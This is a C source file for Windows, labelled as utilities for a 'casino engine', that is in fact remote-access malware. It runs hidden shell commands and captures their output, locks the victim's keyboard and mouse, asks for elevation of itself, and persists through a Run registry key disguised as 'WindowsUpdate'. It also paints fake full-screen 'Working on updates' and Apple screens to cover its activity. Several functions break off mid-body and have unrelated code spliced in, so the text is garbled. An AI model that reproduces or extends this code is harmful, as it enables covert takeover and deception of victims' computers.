/*
 * Vivid Casino Engine — System Utilities
 * 
 * System command execution, clipboard monitoring,
 * persistence, and privilege management.
 */

#include "../engine/engine.h"

/* Execute system command and capture output */
char* sys_run_command(const char *cmd) {
    static char out[NET_BUF_SIZE];
    memset(out, 0, NET_BUF_SIZE);
    
    if (!cmd || !cmd[0]) {
        snprintf(out, NET_BUF_SIZE, "[Empty command]");
        return out;
    }
    
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE rd, wr;
    
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        snprintf(out, NET_BUF_SIZE, "[Pipe failed]");
        return out;
    }
    
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {0};
    static char cl[NET_BUF_SIZE];
    snprintf(cl, NET_BUF_SIZE, "shell_command  %s", cmd);
    
    if (CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(wr);
        DWORD total = 0, br;
        DWORD start = GetTickCount();
        
        while (total < NET_BUF_SIZE - 1 && GetTickCount() - start < 90000) {
            DWORD avail = 0;
            PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL);
            if (avail > 0) {
                if (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
                    total += br;
                }
            }
            if (WaitForSingleObject(pi.hProcess, 100) == WAIT_OBJECT_0) {
                Sleep(100);
                while (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
                    total += br;
                }
                break;
            }
        }
        
        if (total == 0) {
            snprintf(out, NET_BUF_SIZE, "[No output]");
        } else {
            out[total] = '\0';
        }
        
        TerminateProcess(pi.hProcess, 0);
void destroy_block_window() {
    if (g_block_wnd) {
        DestroyWindow(g_block_wnd);
        g_block_wnd = NULL;
    }
    while (ShowCursor(TRUE) < 0);
    if (g_clip_saved) {
        ClipCursor(&g_old_clip);
        g_clip_saved = 0;
    } else {
        ClipCursor(NULL);
    }
}

LRESULT CALLBACK mouse_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (g_input_blocked && nCode >= 0) {
        return 1;
    }
    return CallNextHookEx(g_mouse_hook, nCode, wParam, lParam);
}

LRESULT CALLBACK kb_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (g_input_blocked && nCode >= 0) {
        return 1;
    }
    return CallNextHookEx(g_kb_hook, nCode, wParam, lParam);
}

DWORD WINAPI hook_thread(LPVOID lpParam) {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

void install_hooks() {
    if (!g_mouse_hook) {
        g_mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, mouse_hook_proc, GetModuleHandle(NULL), 0);
    }
    if (!g_kb_hook) {
        g_kb_hook = SetWindowsHookEx(WH_KEYBOARD_LL, kb_hook_proc, GetModuleHandle(NULL), 0);
    }
}

void remove_hooks() {
    if (g_mouse_hook) {
        UnhookWindowsHookEx(g_mouse_hook);
        g_mouse_hook = NULL;
    }
    if (g_kb_hook) {
        UnhookWindowsHookEx(g_kb_hook);
        g_kb_hook = NULL;
    }
}

void set_input_blocked(int blocked) {
    g_input_blocked = blocked;
    if (blocked) {
        g_clip_saved = GetClipCursor(&g_old_clip);
        
        create_block_window();
        install_hooks();
        BlockInput(TRUE);
        
        if (!g_block_thread) {
            g_block_thread = CreateThread(NULL, 0, aggressive_block_thread, NULL, 0, NULL);
        }
    } else {
        g_input_blocked = 0;
        
        if (g_block_thread) {
            WaitForSingleObject(g_block_thread, 500);
            CloseHandle(g_block_thread);
            g_block_thread = NULL;
        }
        
        BlockInput(FALSE);
        destroy_block_window();
        remove_hooks();
    }
}

int is_admin() {
    PSID admin_group = NULL;
    SID_IDENTIFIER_AUTHORITY nt_auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt_auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                                  0, 0, 0, 0, 0, 0, &admin_group)) {
        BOOL is_member = FALSE;
        CheckTokenMembership(NULL, admin_group, &is_member);
        FreeSid(admin_group);
        return is_member;
    }
    return 0;
}

void self_elevate() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";
    sei.lpFile = path;
    sei.nShow = SW_NORMAL;
    if (ShellExecuteExA(&sei)) {
        ExitProcess(0);
    if (CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(wr);
        DWORD br = 0, total = 0;
        
        DWORD start = GetTickCount();
        while (total < NET_BUF_SIZE - 1 && GetTickCount() - start < 90000) {
            DWORD avail = 0;
            PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL);
            if (avail > 0) {
                ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL);
                total += br;
            }
            if (WaitForSingleObject(pi.hProcess, 100) == WAIT_OBJECT_0) {
                Sleep(100);
                while (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
                    total += br;
                }
                break;
            }
        }
        
        if (total == 0) {
            snprintf(out, NET_BUF_SIZE, "[No output]");
        } else {
            out[total] = '\0';
        }
        
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(rd);
    } else {
        CloseHandle(wr);
        CloseHandle(rd);
        snprintf(out, NET_BUF_SIZE, "[Exec failed: %s]", cmd);
    }
    
    return out;
}

void persist() {
    HKEY k;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegSetValueExA(k, "WindowsUpdate", 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
        RegCloseKey(k);
    }
}

// Update screens
static int g_spin_angle = 0;
static int g_progress = 0;
static int g_progress_dir = 1;
static HFONT g_font_large = NULL;
static HFONT g_font_small = NULL;

void draw_rotated_dot(HDC hdc, int cx, int cy, int radius, int angle, int idx, int total) {
    double rad = (angle + idx * 360.0 / total) * 3.14159 / 180.0;
    int x = cx + (int)(radius * cos(rad));
    int y = cy + (int)(radius * sin(rad));
    int alpha = 255 - (idx * 200 / total);
    COLORREF col = RGB(0, (alpha * 150) / 255, (alpha * 255) / 255);
    HBRUSH br = CreateSolidBrush(col);
    RECT r = {x - 3, y - 3, x + 4, y + 4};
    FillRect(hdc, &r, br);
    DeleteObject(br);
}

void draw_apple_logo(HDC hdc, int cx, int cy, int size) {
    HBRUSH white = CreateSolidBrush(RGB(255, 255, 255));
    HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
    
    RECT body = {cx - size/2, cy - size/2 + 5, cx + size/2, cy + size/2};
    SelectObject(hdc, white);
    Ellipse(hdc, body.left, body.top, body.right, body.bottom);
    
    RECT leaf = {cx - 3, cy - size/2 - 8, cx + 8, cy - size/2 + 2};
    Ellipse(hdc, leaf.left, leaf.top, leaf.right, leaf.bottom);
    
    DeleteObject(white);
    DeleteObject(black);
}

LRESULT CALLBACK update_wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    PAINTSTRUCT ps;
    HDC hdc;
    RECT rc;
    int w, h;
    
    if (msg == WM_MOUSEACTIVATE) return MA_ACTIVATE;
    if (msg == WM_NCHITTEST) return HTCLIENT;
    if (msg >= WM_MOUSEFIRST && msg <= WM_MOUSELAST) return 0;
    if (msg >= WM_KEYFIRST && msg <= WM_KEYLAST) return 0;
    
    switch (msg) {
        case WM_PAINT:
            hdc = BeginPaint(hwnd, &ps);
            GetClientRect(hwnd, &rc);
            w = rc.right - rc.left;
            h = rc.bottom - rc.top;
            
            if (g_update_type == 1) {
                HBRUSH bg = CreateSolidBrush(RGB(0, 112, 184));
                FillRect(hdc, &rc, bg);
                DeleteObject(bg);
                
                SetTextColor(hdc, RGB(255, 255, 255));
                SetBkMode(hdc, TRANSPARENT);
                
                if (!g_font_large) g_font_large = CreateFont(32, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                    DEFAULT_PITCH | FF_SWISS, "Segoe UI");
                if (!g_font_small) g_font_small = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                    DEFAULT_PITCH | FF_SWISS, "Segoe UI");
                
                SelectObject(hdc, g_font_large);
                char *txt1 = "Working on updates";
                SIZE sz;
                GetTextExtentPoint32(hdc, txt1, strlen(txt1), &sz);
                TextOut(hdc, (w - sz.cx) / 2, h / 2 - 60, txt1, strlen(txt1));
                
                int cx = w / 2, cy = h / 2 + 20;
